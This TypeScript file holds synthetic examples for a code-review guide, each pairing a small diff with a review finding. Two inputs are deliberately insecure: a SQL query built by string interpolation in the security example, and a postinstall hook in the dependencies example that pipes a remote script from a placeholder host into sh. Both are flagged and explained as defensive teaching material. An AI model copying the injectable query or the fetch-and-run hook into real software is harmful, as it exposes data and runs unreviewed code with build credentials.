// Short, synthetic examples for the in-product lens guide. They demonstrate
// the review contract without reproducing any real pull request or repository.
import type { ReviewLensId } from "./lenses";

export interface LensExample {
  whenToUse: string;
  input: string;
  output: string;
}

export const LENS_EXAMPLES: Record<ReviewLensId, LensExample> = {
  correctness: {
    whenToUse: "Use this on every review. It is the baseline lens for changed behavior, callers and edge cases.",
    input: `src/profile.ts
+ export function normalizeEmail(user: User): string {
+   return user.profile.email.trim().toLowerCase();
+ }`,
    output: `src/profile.ts:2 - Major, high confidence
Trigger: user.profile is optional.
Consequence: a user without a profile throws before the email is normalized.
Suggestion: guard profile and email, then return an empty value or a documented fallback.`
  },
  security: {
    whenToUse: "Use this when a change crosses a trust boundary, handles credentials or personal data, or reaches SQL, commands, templates or file paths.",
    input: `src/query.ts
+ export function findUser(id: string) {
+   return db.query(\`SELECT * FROM users WHERE id = '\${id}'\`);
+ }`,
    output: `src/query.ts:2 - Critical, high confidence
Trigger: id comes from the request and is interpolated into SQL.
Consequence: an attacker can change the query and read or modify other rows.
Suggestion: use a parameterized query and pass id as a bound value.`
  },
  tests: {
    whenToUse: "Use this when behavior changes, a test is changed, or a new branch or failure mode is introduced.",
    input: `src/email.ts
+ return user.profile?.email?.trim().toLowerCase() ?? "";

test/email.test.ts
- expect(normalizeEmail(user)).toBe("A@EXAMPLE.COM");
+ // removed while the function is rewritten`,
    output: `test/email.test.ts:3 - Minor, high confidence
Trigger: the only normalization assertion was removed.
Consequence: the missing-profile and casing paths no longer have a regression guard.
Suggestion: keep a test for the guarded path and add an explicit casing assertion.`
  },
  license: {
    whenToUse: "Use this when files are added from another source, dependencies change, or the repository's license and notice obligations need a review.",
    input: `src/vendor/chart.ts
+ // Copied from an external charting project.
+ export function drawChart(data: unknown) { ... }`,
    output: `src/vendor/chart.ts:1 - Warning, medium confidence
Trigger: a vendored file was added with no license header or source reference.
Consequence: the repository may be missing attribution or compatible terms for this code.
Suggestion: identify the upstream project and license, add the required notice, and confirm redistribution terms.`
  },
  performance: {
    whenToUse: "Use this when a change affects request paths, database access, large collections, caching or other work that grows with input.",
    input: `src/orders.ts
+ for (const order of orders) {
+   order.customer = await db.findCustomer(order.customerId);
+ }`,
    output: `src/orders.ts:2 - Major, high confidence
Trigger: one customer query runs for every order.
Consequence: database round trips grow with the result size and can dominate this request.
Suggestion: batch the customer ids and fetch them in one query, or include the relation in the initial query.`
  },
  maintainability: {
    whenToUse: "Use this when a change adds control flow, duplicates a rule, or makes the affected code harder to change safely.",
    input: `src/invoice.ts
+ const total = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
+ const tax = total * 0.25;
+
+ export function calculateInvoice(items: Item[]) {
+   return items.reduce((sum, item) => sum + item.price * item.quantity, 0) * 1.25;
+ }`,
    output: `src/invoice.ts:5 - Minor, high confidence
Trigger: the invoice total and tax rule are calculated twice with different expressions.
Consequence: a future tax change can update one path and leave the other inconsistent.
Suggestion: move the total and tax calculation into the existing pricing helper and call it from both paths.`
  },
  data: {
    whenToUse: "Use this for schema changes, data movement, migrations, backfills and changes that must survive a rolling deployment.",
    input: `migrations/042_drop_customer_notes.sql
+ ALTER TABLE customers DROP COLUMN notes;
+ -- No backfill or retention period.`,
    output: `migrations/042_drop_customer_notes.sql:1 - Major, high confidence
Trigger: a populated column is dropped in the same release that stops reading it.
Consequence: customer notes are permanently lost and rollback cannot restore them.
Suggestion: retain the column for a compatibility window, back up the data, and drop it only after the new path is verified.`
  },
  dependencies: {
    whenToUse: "Use this when packages, lockfiles, build steps, containers, infrastructure or pipeline configuration change.",
    input: `package.json
+ "postinstall": "curl -fsSL https://downloads.example.test/setup.sh | sh"`,
    output: `package.json:4 - Major, high confidence
Trigger: installation executes a remote script fetched from an unversioned URL.
Consequence: the build can run unreviewed code with repository and CI credentials.
Suggestion: pin a reviewed dependency or artifact, verify its checksum, and avoid network install scripts.`
  }
};
